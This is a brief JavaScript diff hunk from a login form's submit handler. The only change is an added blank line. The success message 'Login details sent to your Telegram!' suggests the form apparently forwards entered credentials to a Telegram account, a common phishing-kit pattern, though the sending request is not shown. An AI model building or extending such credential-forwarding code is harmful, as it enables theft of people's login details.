@@ -25,6 +25,7 @@ form.addEventListener("submit", (event) => {
     .then((response) => {
       if (response.ok) {
         responseDiv.textContent = "Login details sent to your Telegram!";
+        
         form.reset();
       } else {
         responseDiv.textContent = "Failed to send login details.";
